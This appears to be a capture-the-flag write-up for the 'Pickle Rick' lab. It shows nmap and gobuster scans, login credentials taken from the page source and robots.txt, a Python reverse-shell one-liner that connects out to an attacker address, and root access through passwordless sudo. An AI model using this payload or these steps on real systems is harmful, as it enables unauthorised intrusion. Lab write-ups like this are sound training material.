## Pickle Rick
---

### Reconnaissance

#### Nmap

```
$ nmap -sV -sC 10.10.187.238 -oA recon/recon-picklerick
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-19 01:48 EST
Nmap scan report for 10.10.187.238
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:dc:e1:6e:ed:3f:b3:83:22:3f:8e:c4:c5:11:a8:c3 (RSA)
|   256 2f:25:82:8b:82:9e:2a:22:c6:4e:ed:c0:df:21:7f:98 (ECDSA)
|_  256 11:b8:6b:3d:9b:df:90:0a:f9:f8:8b:8e:c7:ee:23:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.43 seconds

```

#### Gobuster

```
$ gobuster dir -u http://10.10.187.238 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster/gob-picklerick
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.187.238
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/19 01:55:04 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://10.10.187.238/assets/]
/server-status        (Status: 403) [Size: 301]                                   
                                                                                  
===============================================================
2021/12/19 02:33:18 Finished
===============================================================
```

This actually ended up being login.php

#### Logging into the page

Username found in the page source

Password found in the robots.txt


#### Shell Script that worked on the website

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.6.82.216",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```


From there it was just looking around, the first flag was in the /var/www/html folder, second flag was in the /home/rick folder and the third was in the /root/ folder since the web user account has sudo NOPASSWD privileges


